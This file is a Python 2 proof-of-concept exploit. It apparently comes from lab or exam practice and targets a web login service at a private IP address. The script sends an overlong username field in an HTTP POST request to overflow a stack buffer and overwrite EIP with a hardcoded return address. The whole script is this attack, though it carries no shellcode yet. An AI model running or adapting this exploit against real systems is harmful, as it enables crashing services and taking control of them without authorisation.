#!usr/bin/python

import socket
import time
import sys



try:
	print "Overflowing...."

	filler = "A" * 780
	eip = "\x83\x0c\x09\x10"
	offset = "C" * 4
	buffer = "D" * (1500 - len(filler) - len(eip) - len(offset)) 

	inputBuffer = filler + eip + offset + buffer

	content = "username=" + inputBuffer + "&password=A"

	buffer = "POST /login HTTP/1.1\r\n"
	buffer += "HOST: 192.168.178.10\r\n"
	buffer += "User-Agent: Mozilla/5.0 (x11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0,9,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Accept-Encoding: gzip, deflate\r\n"
	buffer += "Referer: http//192.168.178.10/login\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(content))+"\r\n"
	buffer += "\r\n"

	buffer+= content

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.178.10", 80))
	s.send(buffer)

	s.close()

	print 'Done! =]'

except:
	print "No Connection --------"
	sys.exit()
